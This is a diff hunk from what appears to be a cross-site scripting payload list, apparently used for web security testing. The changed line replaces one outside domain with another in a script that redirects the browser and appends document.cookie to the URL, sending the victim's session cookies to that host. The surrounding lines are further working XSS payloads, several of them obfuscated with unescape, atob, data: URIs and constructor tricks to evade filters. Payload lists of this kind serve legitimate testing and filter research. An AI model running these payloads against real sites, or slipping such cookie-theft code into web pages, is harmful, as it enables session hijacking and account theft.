@@ -1687,7 +1687,7 @@ ${alert(1)}
 <script>javascript:alert(1)</script\x0B
 <script>javascript:alert(1)</script\x0D
 <script>javascript:alert(1)<\x00/script>
-<script>location.href='http://xerosecurity.com/.testing/iframe_injection.php?'+document.cookie;</script>//INJECTX
+<script>location.href='http://sn1persecurity.com/.testing/iframe_injection.php?'+document.cookie;</script>//INJECTX
 <script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>     <script src=data:,\u006fnerror=\u0061lert(1)></script>
 <script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>
 <script>new function(){new.target.constructor('alert(1)')();}</script>     <script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>
